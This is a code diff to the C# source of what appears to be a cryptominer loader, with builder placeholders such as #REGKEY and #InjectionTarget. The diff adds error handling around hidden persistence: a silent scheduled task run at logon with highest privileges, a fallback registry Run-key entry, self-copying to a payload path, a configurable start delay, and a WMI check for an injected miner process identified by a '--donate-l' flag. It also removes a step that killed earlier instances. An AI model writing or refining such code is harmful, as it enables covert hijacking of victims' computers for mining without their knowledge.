@@ -35,13 +35,21 @@ public partial class Program
 #if DefInstall
         if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
         {
-            Process.Start(new ProcessStartInfo
-            {
-                FileName = "cmd",
-                Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " /tr " + "'" + "\"" + (PayloadPath) + "\"" + "' & exit",
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true,
-            });
+            try{
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd",
+                    Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " /tr " + "'" + "\"" + (PayloadPath) + "\"" + "' & exit",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                });
+            }
+            catch(Exception ex){
+            Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath);
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
+            }
         }else{
             Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath);
         }
@@ -59,20 +67,6 @@ public partial class Program
         {
             if (Process.GetCurrentProcess().MainModule.FileName != PayloadPath)
             {
-                foreach (Process P in Process.GetProcessesByName(Path.GetFileName(PayloadPath)))
-                {
-                    try
-                    {
-                        if (P.MainModule.FileName == PayloadPath)
-                        {
-                            P.Kill();
-                        }
-                    }
-                    catch
-                    {
-                    }
-                }
-
                 File.WriteAllBytes(PayloadPath, File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName));
                 Thread.Sleep(2 * 1000);
                 RBaseFolder();
@@ -148,21 +142,30 @@ public partial class Program
 
     public static bool RCheckProc()
     {
-        var options = new ConnectionOptions();
-        options.Impersonation = ImpersonationLevel.Impersonate;
-        var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
-        scope.Connect();
-
-        string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
-        var query = new ObjectQuery(wmiQuery);
-        var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
-        var managementObjectCollection = managementObjectSearcher.Get();
-        foreach (ManagementObject retObject in managementObjectCollection)
+        try
         {
-            if (retObject["CommandLine"].ToString().Contains("--donate-l"))
+            var options = new ConnectionOptions();
+            options.Impersonation = ImpersonationLevel.Impersonate;
+            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
+            scope.Connect();
+
+            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
+            var query = new ObjectQuery(wmiQuery);
+            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
+            var managementObjectCollection = managementObjectSearcher.Get();
+            foreach (ManagementObject retObject in managementObjectCollection)
             {
-                return true;
+                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--donate-l"))
+                {
+                    return true;
+                }
             }
+        }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
         }
 
         return false;
@@ -170,10 +173,19 @@ public partial class Program
 
     public static void RInitialize()
     {
-        int startDelay = 0;
-        if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
+        try
         {
-            Thread.Sleep(startDelay * 1000);
+            int startDelay = 0;
+            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
+            {
+                Thread.Sleep(startDelay * 1000);
+            }
+        }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show(ex.ToString());
+#endif
         }
 
         try
